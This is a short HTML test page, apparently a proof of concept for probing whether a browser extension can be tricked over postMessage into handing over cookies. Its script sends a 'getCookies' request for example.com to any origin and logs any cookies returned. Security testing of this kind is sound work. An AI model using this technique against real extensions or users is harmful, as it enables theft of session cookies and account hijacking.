<!DOCTYPE html>
<html>
<head>
    <title>Message Hijack Test</title>
</head>
<body>
    <h1>Message Hijack Test Page</h1>
    <script>
        // Try to trigger extension to steal cookies via postMessage
        setTimeout(() => {
            window.postMessage({
                action: 'getCookies',
                domain: 'example.com'
            }, '*');
            console.log('Sent getCookies message');
        }, 1000);
        
        // Listen for response
        window.addEventListener('message', (e) => {
            if (e.data && e.data.cookies) {
                console.log('Received cookies:', e.data.cookies);
            }
        });
    </script>
</body>
</html>
